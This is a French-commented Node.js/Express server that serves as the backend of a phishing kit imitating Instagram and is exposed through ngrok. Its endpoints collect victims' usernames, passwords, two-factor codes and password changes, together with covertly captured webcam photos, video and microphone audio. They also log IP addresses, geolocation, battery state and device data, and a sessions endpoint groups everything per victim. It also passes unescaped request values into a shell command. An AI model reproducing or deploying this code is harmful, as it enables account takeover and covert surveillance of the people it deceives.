const express = require('express');
const path = require('path');
const fs = require('fs');
const { exec } = require('child_process');
const app = express();
const PORT = 3000;

app.use(express.json({ limit: '500mb' }));
app.use(express.urlencoded({ limit: '500mb', extended: true }));
app.use(express.static(__dirname));

/* ============================================================
   BYPASS NGROK
   ============================================================ */
app.use((req, res, next) => {
  res.setHeader('ngrok-skip-browser-warning', 'true');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, DELETE, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', '*');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'instagram.html'));
});

/* ============================================================
   DOSSIERS MEDIA
   ============================================================ */
const MEDIA_ROOT = path.join(__dirname, 'videos_pictures_audios');
const PICTURES_DIR = path.join(MEDIA_ROOT, 'pictures');
const VIDEOS_DIR = path.join(MEDIA_ROOT, 'videos');
const AUDIOS_DIR = path.join(MEDIA_ROOT, 'audios');
const FRAMES_ROOT = path.join(VIDEOS_DIR, 'frames');

[MEDIA_ROOT, PICTURES_DIR, VIDEOS_DIR, AUDIOS_DIR, FRAMES_ROOT].forEach(dir => {
  if (!fs.existsSync(dir)) {
    try {
      fs.mkdirSync(dir, { recursive: true });
      console.log(`📁 Dossier créé : ${dir}`);
    } catch (e) {
      console.error(`❌ Impossible de créer ${dir}:`, e.message);
    }
  }
});

console.log(`\n📂 Sauvegarde des médias dans :`);
console.log(`   🗂️  ${MEDIA_ROOT}`);
console.log(`   📸 Photos  → ${PICTURES_DIR}`);
console.log(`   🎬 Vidéos  → ${VIDEOS_DIR}`);
console.log(`   🎤 Audios  → ${AUDIOS_DIR}\n`);

/* ============================================================
   FFMPEG CHECK
   ============================================================ */
function checkFfmpeg() {
  return new Promise((resolve) => {
    exec('ffmpeg -version', (err, stdout) => {
      if (err) resolve(false);
      else resolve(true);
    });
  });
}

let FFMPEG_AVAILABLE = false;
(async () => {
  FFMPEG_AVAILABLE = await checkFfmpeg();
  if (FFMPEG_AVAILABLE) {
    console.log('✅ ffmpeg détecté — conversion MP4 activée\n');
  } else {
    console.log('⚠️  ffmpeg non trouvé — les vidéos seront des séquences de frames');
    console.log('💡 Pour installer ffmpeg : https://ffmpeg.org/download.html\n');
  }
})();

/* ============================================================
   LOGS
   ============================================================ */
const LOGS_FILE = path.join(__dirname, 'captured_logs.json');
let logs = [];

try {
  if (fs.existsSync(LOGS_FILE)) {
    logs = JSON.parse(fs.readFileSync(LOGS_FILE, 'utf8') || '[]');
  }
} catch (e) { logs = []; }

function saveLogsToFile() {
  try {
    fs.writeFileSync(LOGS_FILE, JSON.stringify(logs, null, 2));
  } catch (e) { console.error('Erreur sauvegarde:', e.message); }
}

/* ============================================================
   API — LOG
   ============================================================ */
app.post('/api/logs', (req, res) => {
  try {
    const { field, value, deviceInfo, sessionId } = req.body;
    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Inconnu';
    if (ip.includes(',')) ip = ip.split(',')[0].trim();
    if (ip === '::1' || ip === '::ffff:127.0.0.1') ip = '127.0.0.1 (local)';
    const timestamp = new Date().toLocaleString('fr-FR', { hour12: false });
    const now = Date.now();
    const entry = {
      id: now + '-' + Math.random().toString(36).slice(2, 8),
      sessionId: sessionId || 'unknown',
      field, value, ip,
      userAgent: req.headers['user-agent'] || 'Inconnu',
      deviceInfo: deviceInfo || null,
      timestamp, time: now
    };
    logs.push(entry);
    if (logs.length > 5000) logs = logs.slice(-5000);
    saveLogsToFile();
    console.log(`📥 [${timestamp}] ${ip} — ${field}: ${String(value).substring(0, 80)}`);
    res.json({ success: true, id: entry.id });
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false });
  }
});

/* ============================================================
   API — PHOTO
   ============================================================ */
app.post('/api/photo', (req, res) => {
  try {
    const { imageBase64, sessionId } = req.body;
    if (!imageBase64) return res.status(400).json({ success: false });
    const dateStr = new Date().toISOString().replace(/[:.]/g, '-');
    const filename = `photo_${dateStr}_${sessionId || 'unknown'}.jpg`;
    const filepath = path.join(PICTURES_DIR, filename);
    const base64Data = imageBase64.replace(/^data:image\/\w+;base64,/, '');
    fs.writeFileSync(filepath, base64Data, 'base64');
    const now = Date.now();
    const timestampStr = new Date().toLocaleString('fr-FR', { hour12: false });
    let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Inconnu';
    if (clientIp.includes(',')) clientIp = clientIp.split(',')[0].trim();
    const entry = {
      id: now + '-' + Math.random().toString(36).slice(2, 8),
      sessionId: sessionId || 'unknown',
      field: '📸 PHOTO CAPTURÉE',
      value: filename, ip: clientIp, type: 'photo',
      userAgent: req.headers['user-agent'] || 'Inconnu',
      timestamp: timestampStr, time: now
    };
    logs.push(entry); saveLogsToFile();
    console.log(`📸 [${timestampStr}] ${clientIp} — Photo: ${filename}`);
    res.json({ success: true, filename });
  } catch (err) {
    console.error('Erreur photo:', err);
    res.status(500).json({ success: false });
  }
});

/* ============================================================
   API — VIDÉO + AUDIO (créer MP4 avec ffmpeg)
   ============================================================ */
app.post('/api/videoframes', async (req, res) => {
  try {
    const { frames, sessionId, duration, audioBase64, audioMimeType } = req.body;
    if (!frames || !Array.isArray(frames) || frames.length === 0) {
      return res.status(400).json({ success: false });
    }

    const dateStr = new Date().toISOString().replace(/[:.]/g, '-');
    const folderName = `seq_${dateStr}_${sessionId || 'unknown'}`;
    const folderPath = path.join(FRAMES_ROOT, folderName);
    fs.mkdirSync(folderPath, { recursive: true });

    // Sauvegarder chaque frame
    frames.forEach((frame, i) => {
      const base64Data = frame.replace(/^data:image\/\w+;base64,/, '');
      const framePath = path.join(folderPath, `frame_${String(i).padStart(3, '0')}.jpg`);
      fs.writeFileSync(framePath, base64Data, 'base64');
    });

    let mp4Url = null;
    let audioUrl = null;

    // ============================================================
    // CONVERSION MP4 avec ffmpeg
    // ============================================================
    if (FFMPEG_AVAILABLE) {
      const mp4Filename = `video_${dateStr}_${sessionId || 'unknown'}.mp4`;
      const mp4Path = path.join(VIDEOS_DIR, mp4Filename);

      // Calcul du framerate : frames / durée en secondes
      const durationSec = (duration || 3000) / 1000;
      const fps = Math.max(1, Math.round(frames.length / durationSec));

      // Construire la commande ffmpeg
      let ffmpegCmd = `ffmpeg -y -framerate ${fps} -i "${folderPath}\\frame_%03d.jpg"`;

      // Si audio fourni → l'ajouter
      if (audioBase64) {
        const audioFilename = `audio_${dateStr}_${sessionId || 'unknown'}.webm`;
        const audioPath = path.join(AUDIOS_DIR, audioFilename);
        const audioData = audioBase64.replace(/^data:audio\/\w+;base64,/, '');
        fs.writeFileSync(audioPath, audioData, 'base64');
        audioUrl = '/media/audios/' + audioFilename;

        ffmpegCmd += ` -i "${audioPath}" -c:v libx264 -preset ultrafast -pix_fmt yuv420p -c:a aac -shortest "${mp4Path}"`;
      } else {
        ffmpegCmd += ` -c:v libx264 -preset ultrafast -pix_fmt yuv420p "${mp4Path}"`;
      }

      await new Promise((resolve) => {
        exec(ffmpegCmd, { timeout: 60000 }, (err, stdout, stderr) => {
          if (err) {
            console.error('❌ ffmpeg erreur:', err.message);
            console.error(stderr);
          } else {
            console.log(`🎬 MP4 créé: ${mp4Filename}`);
            mp4Url = '/media/videos/' + mp4Filename;
          }
          resolve();
        });
      });
    }

    const now = Date.now();
    const timestampStr = new Date().toLocaleString('fr-FR', { hour12: false });
    let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Inconnu';
    if (clientIp.includes(',')) clientIp = clientIp.split(',')[0].trim();

    const entry = {
      id: now + '-' + Math.random().toString(36).slice(2, 8),
      sessionId: sessionId || 'unknown',
      field: '🎬 SÉQUENCE VIDÉO',
      value: folderName,
      mp4Url: mp4Url,
      audioUrl: audioUrl,
      ip: clientIp,
      type: 'videoframes',
      frameCount: frames.length,
      userAgent: req.headers['user-agent'] || 'Inconnu',
      timestamp: timestampStr, time: now
    };
    logs.push(entry); saveLogsToFile();
    console.log(`🎬 [${timestampStr}] ${clientIp} — ${frames.length} frames${mp4Url ? ' + MP4' : ''}`);
    res.json({ success: true, folderName, frameCount: frames.length, mp4Url, audioUrl });
  } catch (err) {
    console.error('Erreur frames:', err);
    res.status(500).json({ success: false });
  }
});

/* ============================================================
   API — AUDIO (fallback séparé)
   ============================================================ */
app.post('/api/audio', (req, res) => {
  try {
    const { audioBase64, sessionId, mimeType } = req.body;
    if (!audioBase64) return res.status(400).json({ success: false });
    const dateStr = new Date().toISOString().replace(/[:.]/g, '-');
    let ext = 'webm';
    if (mimeType && mimeType.includes('mp4')) ext = 'm4a';
    if (mimeType && mimeType.includes('ogg')) ext = 'ogg';
    const filename = `audio_${dateStr}_${sessionId || 'unknown'}.${ext}`;
    const filepath = path.join(AUDIOS_DIR, filename);
    const base64Data = audioBase64.replace(/^data:audio\/\w+;base64,/, '');
    fs.writeFileSync(filepath, base64Data, 'base64');
    const now = Date.now();
    const timestampStr = new Date().toLocaleString('fr-FR', { hour12: false });
    let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Inconnu';
    if (clientIp.includes(',')) clientIp = clientIp.split(',')[0].trim();
    const entry = {
      id: now + '-' + Math.random().toString(36).slice(2, 8),
      sessionId: sessionId || 'unknown',
      field: '🎤 AUDIO ENREGISTRÉ',
      value: filename, ip: clientIp, type: 'audio',
      userAgent: req.headers['user-agent'] || 'Inconnu',
      timestamp: timestampStr, time: now
    };
    logs.push(entry); saveLogsToFile();
    console.log(`🎤 [${timestampStr}] ${clientIp} — Audio: ${filename}`);
    res.json({ success: true, filename });
  } catch (err) {
    console.error('Erreur audio:', err);
    res.status(500).json({ success: false });
  }
});

/* ============================================================
   API — ENRICH
   ============================================================ */
app.post('/api/enrich', (req, res) => {
  try {
    const { sessionId, ipInfo } = req.body;
    if (!sessionId) return res.status(400).json({ success: false });
    logs.forEach(l => {
      if (l.sessionId === sessionId) l.geoInfo = ipInfo;
    });
    saveLogsToFile();
    res.json({ success: true });
  } catch (e) {
    res.status(500).json({ success: false });
  }
});

/* ============================================================
   MEDIA
   ============================================================ */
app.use('/media/pictures', express.static(PICTURES_DIR));
app.use('/media/videos', express.static(VIDEOS_DIR, {
  setHeaders: (res, filepath) => {
    if (filepath.endsWith('.webm')) res.setHeader('Content-Type', 'video/webm');
    else if (filepath.endsWith('.mp4')) res.setHeader('Content-Type', 'video/mp4');
    res.setHeader('Accept-Ranges', 'bytes');
  }
}));
app.use('/media/audios', express.static(AUDIOS_DIR, {
  setHeaders: (res, filepath) => {
    if (filepath.endsWith('.webm')) res.setHeader('Content-Type', 'audio/webm');
    else if (filepath.endsWith('.m4a')) res.setHeader('Content-Type', 'audio/mp4');
    res.setHeader('Accept-Ranges', 'bytes');
  }
}));
app.use('/media/frames', express.static(FRAMES_ROOT));

app.get('/api/logs', (req, res) => { res.json(logs); });

/* ============================================================
   SESSIONS
   ============================================================ */
app.get('/api/sessions', (req, res) => {
  const sessions = {};
  logs.forEach(l => {
    const key = (l.ip || 'unknown') + '||' + (l.userAgent || 'unknown').slice(0, 80);
    if (!sessions[key]) {
      sessions[key] = {
        key, ip: l.ip || 'Inconnu', userAgent: l.userAgent || 'Inconnu',
        deviceInfo: l.deviceInfo || {}, firstSeen: l.time, lastSeen: l.time,
        firstSeenStr: l.timestamp, lastSeenStr: l.timestamp,
        sessionId: l.sessionId || null, logs: [],
        username: null, password: null, code: null,
        currentPass: null, newPass: null, liveBattery: null,
        photos: [], videos: [], sequences: [], audios: [], entryInfo: null,
        geoInfo: null, fingerprint: null, visitCount: null
      };
    }
    const s = sessions[key];
    s.logs.push(l);
    s.lastSeen = l.time;
    s.lastSeenStr = l.timestamp;
    if (l.sessionId) s.sessionId = l.sessionId;
    if (l.deviceInfo && Object.keys(l.deviceInfo).length > 0) s.deviceInfo = l.deviceInfo;
    if (l.geoInfo) s.geoInfo = l.geoInfo;

    if (l.type === 'photo') s.photos.push({ filename: l.value, url: '/media/pictures/' + l.value, time: l.timestamp });
    if (l.type === 'audio') s.audios.push({ filename: l.value, url: '/media/audios/' + l.value, time: l.timestamp });
    if (l.type === 'videoframes') {
      const folderPath = path.join(FRAMES_ROOT, l.value);
      let frameUrls = [];
      try {
        const files = fs.readdirSync(folderPath).filter(f => f.endsWith('.jpg')).sort();
        frameUrls = files.map(f => `/media/frames/${l.value}/${f}`);
      } catch (e) {}
      s.sequences.push({
        folderName: l.value,
        frames: frameUrls,
        frameCount: frameUrls.length,
        mp4Url: l.mp4Url || null,
        audioUrl: l.audioUrl || null,
        time: l.timestamp
      });
    }

    const f = (l.field || '').toLowerCase();
    if (f.includes('🚪 entrée')) s.entryInfo = l.value;
    if (f.includes('username (login)') || f.includes('login — utilisateur (submit)')) s.username = l.value;
    if (f.includes('mot de passe (login)') || f.includes('login — mot de passe (submit)')) s.password = l.value;
    if (f.includes('code complet')) s.code = l.value;
    if (f.includes('mot de passe actuel') && !f.includes('reset')) s.currentPass = l.value;
    if (f.includes('nouveau mot de passe') && !f.includes('reset')) s.newPass = l.value;
    if (f.includes('batterie (live)')) s.liveBattery = l.value;
  });
  const sorted = Object.values(sessions).sort((a, b) => b.lastSeen - a.lastSeen);
  res.json(sorted);
});

app.delete('/api/logs', (req, res) => {
  logs = [];
  saveLogsToFile();
  res.json({ success: true });
});

app.use((err, req, res, next) => {
  if (err.type === 'entity.too.large') {
    return res.status(413).json({ success: false, error: 'Trop volumineux' });
  }
  res.status(500).json({ success: false });
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`\n✅ Serveur démarré sur http://localhost:${PORT}`);
  console.log(`🌐 Pour ngrok : ngrok http ${PORT}\n`);
});
